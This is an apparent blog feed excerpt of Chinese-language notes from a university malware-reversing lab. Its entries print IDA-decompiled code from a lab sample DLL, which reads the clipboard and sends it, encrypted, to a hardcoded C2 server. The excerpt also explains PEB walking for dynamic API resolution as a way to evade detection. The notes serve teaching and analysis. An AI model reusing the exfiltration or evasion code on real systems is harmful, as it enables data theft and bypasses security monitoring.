&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001260(&lt;span style="color:#e6db74">&amp;#34;get_reflectivce_loader_offset failed&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/</guid><description>&lt;h1 id="simple-reverse---0x222023-lab---winmalware---collect">
 Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
 &lt;a class="anchor" href="#simple-reverse---0x222023-lab---winmalware---collect">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>如果想要分析DLL，可以從以下三個地方切入&lt;/p>
&lt;ul>
&lt;li>_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)
&lt;ul>
&lt;li>DllMain / DllEntryPoint / CRT_INIT (function signature 相同)&lt;/li>
&lt;li>找有三個參數的 function call
&lt;img src="https://hackmd.io/_uploads/Sk0GgCaz6.png" alt="" />
範例就大概像這樣，從&lt;code>_DllMainCRTStartup&lt;/code>底下有&lt;code>call _CRT_INIT&lt;/code>和&lt;code>call DllEntryPoint&lt;/code>(&lt;code>DllMain&lt;/code>在比較下面)
&lt;img src="https://hackmd.io/_uploads/HklyZRTf6.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Exported Functions&lt;/li>
&lt;li>TLS Callback&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard">OpenClipboard&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata">GetClipboardData&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock">globalLock&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170">_itoa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法&lt;/p>
&lt;ul>
&lt;li>DllMain
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
 if ( fdwReason == 1 )
 {
 MessageBoxA(0i64, &amp;#34;Reflective Dll Injection success. Remember to delete the persistence file&amp;#34;, &amp;#34;eductf-lab&amp;#34;, 0);
 my_main(); // 不重要的東西
 collect_and_exfiltrate();
 }
 return 1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_and_exfiltrate
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void collect_and_exfiltrate(void)
{
 PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

 pbInput = 0i64;
 collect_data(&amp;amp;pbInput);
 exfiltrate(pbInput);
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_data(char **pbInput)
{
 char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

 collect_get_clipboard_data(&amp;amp;pbInput_1);
 *pbInput = pbInput_1;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>collect_get_clipboard_data
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
{
 HANDLE ClipboardData; // rax
 void *v3; // rsi
 int LastError; // eax
 char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

 if ( OpenClipboard(0i64) )
 {
 ClipboardData = GetClipboardData(1u);
 v3 = ClipboardData;
 if ( ClipboardData )
 {
 *pbInput = GlobalLock(ClipboardData);
 GlobalUnlock(v3);
 }
 else
 {
 LastError = GetLastError();
 _itoa(LastError, Buffer, 10);
 }
 }
 CloseClipboard();
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢&lt;/p></description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/</guid><description>&lt;h1 id="simple-reverse---0x232023-lab---winmalware---exfiltrate">
 Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)
 &lt;a class="anchor" href="#simple-reverse---0x232023-lab---winmalware---exfiltrate">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-htons">htons&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-socket">socket&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/winsock/sockaddr-2">sockaddr&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winsock2/nf-winsock2-wsaconnect">WSAConnect&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>exfiltrate
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">exfiltrate&lt;/span>(PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> s[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+28h] [rbp-10h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect_to_c2(s);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send_collected_data_to_c2(s[&lt;span style="color:#ae81ff">0&lt;/span>], pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shutdown(s[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> closesocket(s[&lt;span style="color:#ae81ff">0&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>connect_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">connect_to_c2&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v2; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sockaddr&lt;/span> name; &lt;span style="color:#75715e">// [rsp+20h] [rbp-1B8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">WSAData&lt;/span> WSAData; &lt;span style="color:#75715e">// [rsp+30h] [rbp-1A8h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>WSAStartup(&lt;span style="color:#ae81ff">0x202u&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>WSAData) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&amp;amp;&lt;/span>name.sa_data[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">168470720&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>name.sa_data &lt;span style="color:#f92672">=&lt;/span> htons(&lt;span style="color:#ae81ff">0x2BB3u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name.sa_family &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> socket(&lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>a1 &lt;span style="color:#f92672">=&lt;/span> v2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> connect(v2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>name, &lt;span style="color:#ae81ff">16&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;li>send_collected_data_to_c2
:::spoiler source
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">send_collected_data_to_c2&lt;/span>(SOCKET s, PUCHAR pbInput)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v5; &lt;span style="color:#75715e">// esi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v7; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// ecx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v9; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x4Cu&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v5 &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( recv(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0xB&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v9 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span> ( v9 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_key &lt;span style="color:#f92672">=&lt;/span> (v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> encrypt_data(pbInput);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">23&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>] &lt;span style="color:#f92672">+=&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> memcpy_s(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span>, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64, cipher, &lt;span style="color:#ae81ff">0x18u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_20;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x11877811&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">39&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">43&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">49&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> v4[&lt;span style="color:#ae81ff">67&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4[j &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">36&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> v4[&lt;span style="color:#ae81ff">54&lt;/span>] &lt;span style="color:#f92672">-&lt;/span> (v4[&lt;span style="color:#ae81ff">61&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4[&lt;span style="color:#ae81ff">69&lt;/span>]) &lt;span style="color:#f92672">+&lt;/span> v7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> send(s, v4, &lt;span style="color:#ae81ff">76&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_20:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> free(v4);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>&lt;code>connet_to_c2&lt;/code>
目標是取得c2 server的IP和port number&lt;/p></description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/</guid><description>&lt;h1 id="simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">
 Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)
 &lt;a class="anchor" href="#simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Process Environment Block (PEB)
&lt;ul>
&lt;li>紀錄許多 Process 相關資訊的 OS 資料結構&lt;/li>
&lt;li>存在於 user land&lt;/li>
&lt;li>x86 環境下，可以從 fs:[0x30] 取得&lt;/li>
&lt;li>x64 環境下，可以從 gs:[0x60] 取得&lt;/li>
&lt;li>==0x18: Ldr==
&lt;ul>
&lt;li>指向 _PEB_LDR_DATA 結構&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB">_PEB&lt;/a> (注意 x64 和 x86 結構不同)
&lt;img src="https://hackmd.io/_uploads/HyIcW4CfT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_PEB_LDR_DATA
&lt;ul>
&lt;li>紀錄 Process 中載入模組的相關資訊
&lt;ul>
&lt;li>模組 module：PE 或 DLL&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x10: InLoadOrderModuleList==
&lt;ul>
&lt;li>指向 _LDR_DATA_TABLE_ENTRY&lt;/li>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20%282022%20Update%29/_PEB_LDR_DATA">_PEB_LDR_DATA&lt;/a>
&lt;img src="https://hackmd.io/_uploads/BJFj-NAGp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;ul>
&lt;li>紀錄一個載入模組的相關資訊&lt;/li>
&lt;li>==0x00: InLoadOrderModuleList==
&lt;ul>
&lt;li>依載入順序串起的雙向 linked list&lt;/li>
&lt;li>Flink：指向下一個 entry&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x30: DllBase==
&lt;ul>
&lt;li>此載入模組的 ImageBase&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>==0x58: BaseDllName==
&lt;ul>
&lt;li>此載入模組的檔案名稱&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>_LDR_DATA_TABLE_ENTRY
&lt;img src="https://hackmd.io/_uploads/BJ5JfVAMp.png" alt="" />&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Defense Evasion — Dynamic API Resolution
&lt;ul>
&lt;li>用途:
&lt;blockquote>
&lt;p>駭客常用的手法往往倚賴特定的 API 來達成，例如：&lt;code>Injection&lt;/code> = &lt;code>VirtualAllocEx&lt;/code> + &lt;code>WriteProcessMemory&lt;/code> + &lt;code>CreateRemoteThread&lt;/code>，因此資安產品只要監控這些 API，就很容易偵測到惡意行為
